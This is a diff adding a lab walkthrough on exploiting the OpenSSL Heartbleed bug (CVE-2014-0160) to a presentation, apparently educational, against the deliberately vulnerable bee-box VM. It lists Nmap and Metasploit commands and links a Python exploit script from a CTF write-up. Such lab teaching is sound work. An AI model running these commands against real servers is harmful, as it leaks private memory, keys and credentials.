@@ -78,3 +78,122 @@
 3. [900 SINs stolen due to Heartbleed bug: Canada Revenue Agency](https://globalnews.ca/news/1269168/900-sin-numbers-stolen-due-to-heartbleed-bug-canada-revenue-agency/)
 4. [Devastating Heartbleed Flaw Was Used in Hospital Hack](https://time.com/3148773/report-devastating-heartbleed-flaw-was-used-in-hospital-hack/)
 5. [Heartbleed](https://heartbleed.com/)
+
+
+
+### OpenSSL Heartbleed Exploit
+
+
+
+#### Tools needed
+
+1. A bee-box virtual machine with OpenSSL in version 1.0.1~1.0.2  provided by bWAPP     
+
+   [Download URL](https://sourceforge.net/projects/bwapp/files/bee-box/)
+
+   **bWAPP and bee-box**: bWAPP is short for buggy web application, it allows us to implement penetration testing and ethical hacking projects. Over 100 web bugs are covered which include all major web vulnerabilities. The bee-box is the vulnerable virtual machine provided by bWAPP that can be used for CVE exploits.
+
+2. A Kali-Linux virtual machine（Nmap；Metasploit；Python script）
+
+   [Download URL](https://www.kali.org/downloads/)
+   
+   **Kali-Linux**: Kali-Linux is a kind of Debian Linux which is widely used in ethical hacking. It has hundreds of pre-installed ethical hacking tools. In this presentation, we will use it to hack the vulnerable bee-box.
+   
+   **Nmap**: Nmap is short for Network Mapper, it is an open-source network scanner started by Gordon Lyon. Nmap is a tool for probing computer networks and it is able to detect vulnerabilities.
+   
+   **Metasploit**: Metasploit is a well-known tool deals with computer security, it provides numerous methodologies for vulnerability exploitation. In this presentation, we will use it to execute the exploit of heartbleed vulnerability.
+   
+   
+
+#### Method 1：
+
+1. Open the 2 virtual machines.
+
+2. Use ifconfig command to check the IP address of the bee-box.
+
+3. Use Nmap tool in Kali-Linux to check the heartbleed vulnerability in the bee-box.
+
+~~~
+nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.2.130
+~~~
+
+4. Enter the Metasploit tool in Kali-Linux.
+
+~~~
+msfconsole
+~~~
+
+5. Search the auxiliary of heartbleed cve in Metasploit.
+
+~~~
+search cve-2014-0160
+~~~
+
+6. Pick the OpenSSL heartbleed auxiliary and use it.
+
+~~~
+use auxiliary/scanner/ssl/openssl_heartbleed
+~~~
+
+7. Set target host and port, and set verbose true to make the process seen, then exploit.
+
+~~~
+set RHOST 192.168.2.130
+~~~
+
+~~~
+set RPORT 8443
+~~~
+
+~~~
+set verbose true
+~~~
+
+~~~
+exploit
+~~~
+
+
+
+#### Method 2:
+
+1. Open the 2 virtual machines.
+
+2. Use ifconfig command to check the IP address of the bee-box.
+
+3. Use vim command to create a script  [heartbleed.py](https://github.com/ctfs/write-ups-2014/blob/master/plaid-ctf-2014/heartbleed/heartbleed.py) in Kali-Linux  in Kali-Linux.
+
+4. Ran the script.
+
+   ~~~
+   python heartbleed.py 192.168.2.130 -p 8443
+   ~~~
+
+   
+
+### References:
+[1] Netcraft's April 2014 Web Server Survey, https://news.netcraft.com/archives/2014/04/02/april-2014-web-server-survey.html.
+
+[2] Application Security and Quality Analysis Tools, https://www.synopsys.com/software-integrity/security-testing.html.
+
+[3] NCSC-FI, https://www.kyberturvallisuuskeskus.fi/en,https://news.netcraft.com/archives/2014/04/02/april-2014-web-server-survey.html.
+
+[4] Heartbleed bug News, https://heartbleed.com/.
+
+[5] Heartbleed bug News, https://heartbleed.com/.
+
+[6] Heartbleed bug News, https://heartbleed.com/.![image](https://user-images.githubusercontent.com/52240576/111923122-ed2db580-8a73-11eb-8305-ed1cb52efffe.png)
+
+[7] https://www.concise-courses.com/hacking-tools/
+
+[8] https://www.youtube.com/watch?v=SgJm0C6jzbo&t=47s
+
+[9] https://github.com/ctfs/write-ups-2014/blob/master/plaid-ctf-2014/heartbleed/heartbleed.py
+
+[10] https://sourceforge.net/projects/bwapp/files/bee-box/
+
+[11] https://www.kali.org
+
+[12]https://en.wikipedia.org/wiki/Metasploit_Project
+
+[13]https://en.wikipedia.org/wiki/Nmap
